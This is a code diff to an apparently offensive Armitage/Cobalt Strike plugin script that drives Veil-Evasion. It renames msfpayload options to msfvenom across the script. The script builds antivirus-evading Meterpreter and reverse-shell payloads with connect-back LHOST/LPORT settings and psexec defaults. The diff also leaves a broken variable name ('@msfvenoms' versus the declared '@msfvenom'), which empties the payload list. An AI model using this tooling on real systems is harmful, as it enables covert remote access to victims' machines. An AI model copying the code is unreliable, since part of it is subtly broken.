@@ -7,7 +7,7 @@
 # even between Cobalt Strike/Armitage restarts.
 #
 #
-# Double-clicking Payload or MSFPayload will bring up
+# Double-clicking Payload or msfvenom will bring up
 # appropriate options.
 #
 # Double-clicking LHOST will reset the LHOST variable to
@@ -32,7 +32,7 @@ $veilpath = "";
 # the currently selected payload
 # format is:
 #   payload => "veil_payload"
-#   msfpayload => "windows/meterpreter/blah"
+#   msfvenom => "windows/meterpreter/blah"
 #   lhost => "192.168.1.1"
 #   lport => "4444"
 #   outputbase => "payload"
@@ -213,24 +213,24 @@ sub chooseVeilPayload {
     }, $call => $4), \$tablef);
 }
 
-# choose a particular msfpayload from a list and fill 
+# choose a particular msfvenom from a list and fill 
 # the value into the calling table
-sub chooseMSFPayload {
+sub chooseMSFVenom {
     
-    local('@msfpayloads');
-    @msfpayloads = @(
-        %(msfpayload => "windows/meterpreter/reverse_tcp"),
-        %(msfpayload => "windows/meterpreter/reverse_http"),
-        %(msfpayload => "windows/meterpreter/reverse_https"),
-        %(msfpayload => "windows/meterpreter/reverse_ipv6_tcp"),
-        %(msfpayload => "windows/meterpreter/reverse_ipv6_http"),
-        %(msfpayload => "windows/meterpreter/reverse_ipv6_https"),
-        %(msfpayload => "windows/shell/reverse_tcp"),
-        %(msfpayload => "")
+    local('@msfvenom');
+    @msfvenom = @(
+        %(msfvenom => "windows/meterpreter/reverse_tcp"),
+        %(msfvenom => "windows/meterpreter/reverse_http"),
+        %(msfvenom => "windows/meterpreter/reverse_https"),
+        %(msfvenom => "windows/meterpreter/reverse_ipv6_tcp"),
+        %(msfvenom => "windows/meterpreter/reverse_ipv6_http"),
+        %(msfvenom => "windows/meterpreter/reverse_ipv6_https"),
+        %(msfvenom => "windows/shell/reverse_tcp"),
+        %(msfvenom => "")
     );
 
     # first col argument -> data that's returned when "select" is chosen
-    quickListDialog("Choose a MSFPayload", "Select", @("msfpayload", "msfpayload"), @msfpayloads, $width => 350, $height => 240, lambda({
+    quickListDialog("Choose a MSFVenom", "Select", @("msfvenom", "msfvenom"), @msfvenoms, $width => 350, $height => 240, lambda({
         [$call : $1];
     }, $call => $4), \$tablef);
 }
@@ -252,7 +252,7 @@ sub veil_dialog {
     # if there isn't a last-generated veil payload, throw some defaults in
     if (!%currentVeilPayload){
         %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
-        %currentVeilPayload["msfpayload"] = "windows/meterpreter/reverse_tcp";
+        %currentVeilPayload["msfvenom"] = "windows/meterpreter/reverse_tcp";
         %currentVeilPayload["lhost"] = lhost();
         %currentVeilPayload["lport"] = 4444;
         %currentVeilPayload["outputbase"] = "payload";
@@ -265,7 +265,7 @@ sub veil_dialog {
     [$model setCellEditable: 1];
 
     [$model _addEntry: %(Option => "Payload", Value => %currentVeilPayload["payload"], Tooltip => "Veil-Evasion Payload", Hide => '0')];
-    [$model _addEntry: %(Option => "MSFPayload", Value => %currentVeilPayload["msfpayload"], Tooltip => "msfpayload to use (if applicable)", Hide => '0')];
+    [$model _addEntry: %(Option => "MSFVenom", Value => %currentVeilPayload["msfvenom"], Tooltip => "msfvenom to use (if applicable)", Hide => '0')];
     [$model _addEntry: %(Option => "LHOST", Value => %currentVeilPayload["lhost"], Tooltip => "LHOST to connect back to", Hide => '0')];
     [$model _addEntry: %(Option => "LPORT", Value => %currentVeilPayload["lport"], Tooltip => "LPORT to connect back to", Hide => '0')];
     [$model _addEntry: %(Option => "OutputBase", Value => %currentVeilPayload["outputbase"], Tooltip => "Base name for generated payloads", Hide => '0')];
@@ -321,7 +321,7 @@ sub veil_dialog {
 
         # kick off out payload generation
         # checkbox values => [$overwriteCheckbox isSelected]
-        generatePayload($options["Payload"], $options["MSFPayload"], $options["LHOST"], $options["LPORT"], $options["OutputBase"], [$overwriteCheckbox isSelected], [$psexecCheckbox isSelected]);
+        generatePayload($options["Payload"], $options["MSFVenom"], $options["LHOST"], $options["LPORT"], $options["OutputBase"], [$overwriteCheckbox isSelected], [$psexecCheckbox isSelected]);
         [$dialog setVisible: 0]; # close the dialog off
         })];
 
@@ -368,17 +368,17 @@ sub veil_dialog {
 #       $2 : lport
 #       $3 : the specified payload
 #       $4 : the output base name
-#       $5 : the msfpayload
+#       $5 : the msfvenom
 #       $6 : whether to overwrite
 #       $7 : whether we're doing this for psexec, true/false
 #
 sub generatePayload {
     
-    local('$payload $msfpayload $lhost $lport $outputbase $overwrite $usePsexec $veilcmd @out $handle $line $payloadpath');
+    local('$payload $msfvenom $lhost $lport $outputbase $overwrite $usePsexec $veilcmd @out $handle $line $payloadpath');
     global('$veilpath $psexecPayloadPath %currentVeilPayload');
 
     $payload = $1;
-    $msfpayload = $2;
+    $msfvenom = $2;
     $lhost = $3;
     $lport = $4;
     $outputbase = $5;
@@ -387,7 +387,7 @@ sub generatePayload {
 
     # set the current payload to these options and refresh the database
     %currentVeilPayload["payload"] = $payload;
-    %currentVeilPayload["msfpayload"] = $msfpayload;
+    %currentVeilPayload["msfvenom"] = $msfvenom;
     %currentVeilPayload["lhost"] = $lhost;
     %currentVeilPayload["lport"] = $lport;
     %currentVeilPayload["outputbase"] = $outputbase;
@@ -400,7 +400,7 @@ sub generatePayload {
 
     # if we have a shellcode payload, use this command instead
     if($payload hasmatch "shellcode"){
-        $veilcmd = $veilpath." -p $payload --msfpayload $msfpayload --msfoptions LHOST=$lhost LPORT=$lport PrependMigrate=true -o $outputbase";
+        $veilcmd = $veilpath." -p $payload --msfvenom $msfvenom --msfoptions LHOST=$lhost LPORT=$lport PrependMigrate=true -o $outputbase";
     }
 
     # check if we're overwrite the produced payload
@@ -517,7 +517,7 @@ sub valueListener {
 
     # set our lambdas functions for when these values are clicked
     $actions["Payload"] = lambda(&chooseVeilPayload);
-    $actions["MSFPayload"] = lambda(&chooseMSFPayload);
+    $actions["MSFVenom"] = lambda(&chooseMSFVenom);
 
     # helping logic for mouse interaction
     addMouseListener($table, lambda({
@@ -578,7 +578,7 @@ sub dialog_from_listener {
         # logic to try to set specific options for various listeners
         if (find($payload, 'reverse_tcp')) {
             %currentVeilPayload["payload"] = "c/meterpreter/rev_tcp_service";
-            %currentVeilPayload["msfpayload"] = "n/a";
+            %currentVeilPayload["msfvenom"] = "n/a";
             %currentVeilPayload["lhost"] = $lhost;
             %currentVeilPayload["lport"] = $lport;
             %currentVeilPayload["outputbase"] = "psexec";
@@ -588,7 +588,7 @@ sub dialog_from_listener {
         }
         else if (find($payload, 'reverse_https')) {
             %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
-            %currentVeilPayload["msfpayload"] ="windows/meterpreter/reverse_https";
+            %currentVeilPayload["msfvenom"] ="windows/meterpreter/reverse_https";
             %currentVeilPayload["lhost"] = $lhost;
             %currentVeilPayload["lport"] = $lport;
             %currentVeilPayload["outputbase"] = "psexec";
@@ -598,7 +598,7 @@ sub dialog_from_listener {
         }
         else if (find($payload, 'reverse_http')) {
             %currentVeilPayload["payload"] = "python/shellcode_inject/aes_encrypt";
-            %currentVeilPayload["msfpayload"] ="windows/meterpreter/reverse_http";
+            %currentVeilPayload["msfvenom"] ="windows/meterpreter/reverse_http";
             %currentVeilPayload["lhost"] = $lhost;
             %currentVeilPayload["lport"] = $lport;
             %currentVeilPayload["outputbase"] = "psexec";
@@ -736,4 +736,3 @@ sub dialog {
 sub tableRenderer {
     return [ATable getDefaultTableRenderer: $1, $2];
 }
-
